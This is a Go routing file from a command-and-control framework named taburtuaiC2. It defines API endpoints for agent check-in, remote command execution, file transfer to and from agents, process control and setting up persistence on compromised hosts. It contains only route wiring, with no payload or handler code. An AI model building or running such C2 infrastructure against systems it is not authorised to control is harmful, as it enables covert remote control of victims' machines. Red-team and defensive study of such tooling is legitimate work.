package api

import (
	"net/http"

	"github.com/gin-gonic/gin"
	"github.com/mjopsec/taburtuaiC2/server/core"
)

// Router handles API routing
type Router struct {
	server     *core.Server
	handlers   *Handlers
	middleware *Middleware
}

// NewRouter creates a new router
func NewRouter(server *core.Server) *Router {
	return &Router{
		server:     server,
		handlers:   NewHandlers(server),
		middleware: NewMiddleware(server),
	}
}

// Setup configures all routes
func (r *Router) Setup() *gin.Engine {
	router := gin.New()

	// Global middleware - ORDER MATTERS!
	router.Use(gin.Recovery())                                  // Gin's built-in recovery
	router.Use(r.middleware.ErrorRecovery())                    // Our enhanced recovery
	router.Use(r.middleware.SecurityHeaders())                  // Security headers first
	router.Use(r.middleware.CORS())                             // CORS handling
	router.Use(r.middleware.RequestSizeLimit(10 * 1024 * 1024)) // 10MB limit for most requests
	router.Use(r.middleware.ValidateContentType())              // Content-Type validation
	router.Use(r.middleware.Logging())                          // Request logging
	router.Use(r.middleware.RateLimit())                        // Rate limiting
	router.Use(r.middleware.Auth())                             // Authentication (last before routes)

	// Static files
	router.Static("/static", "./web/static")
	router.LoadHTMLGlob("web/templates/*")
	router.GET("/", r.handlers.Dashboard)

	// API v1 routes
	v1 := router.Group("/api/v1")
	{
		// Agent management
		v1.GET("/agents", r.handlers.ListAgents)
		v1.GET("/agents/:id", r.handlers.GetAgent)
		v1.DELETE("/agents/:id", r.handlers.RemoveAgent)
		v1.POST("/checkin", r.handlers.AgentCheckin)

		// Command execution
		v1.POST("/command", r.handlers.ExecuteCommand)
		v1.GET("/command/:id/next", r.handlers.GetNextCommand)
		v1.POST("/command/result", r.handlers.SubmitCommandResult)
		v1.GET("/command/:id/status", r.handlers.GetCommandStatus)

		// Agent commands
		v1.GET("/agent/:id/commands", r.handlers.GetAgentCommands)
		v1.DELETE("/agent/:id/queue", r.handlers.ClearAgentQueue)

		// File operations (with higher size limits)
		fileGroup := v1.Group("/agent/:id")
		{
			// Remove size limit for file uploads specifically
			fileGroup.POST("/upload", func(c *gin.Context) {
				// Remove the general size limit for this endpoint
				c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, 100*1024*1024) // 100MB for uploads
				r.handlers.UploadToAgent(c)
			})
			fileGroup.POST("/download", r.handlers.DownloadFromAgent)
		}

		// Process management
		process := v1.Group("/agent/:id/process")
		{
			process.POST("/list", r.handlers.ListProcesses)
			process.POST("/kill", r.handlers.KillProcess)
			process.POST("/start", r.handlers.StartProcess)
		}

		// Persistence
		persist := v1.Group("agent/:id/persistence/")
		{
			persist.POST("/setup", r.handlers.SetupPersistence)
			persist.POST("/remove", r.handlers.RemovePersistence)
		}

		// Monitoring
		v1.GET("/stats", r.handlers.GetStats)
		v1.GET("/health", r.handlers.HealthCheck)
		v1.GET("/logs", r.handlers.GetLogs)
		v1.GET("/queue/stats", r.handlers.GetQueueStats)
	}

	return router
}
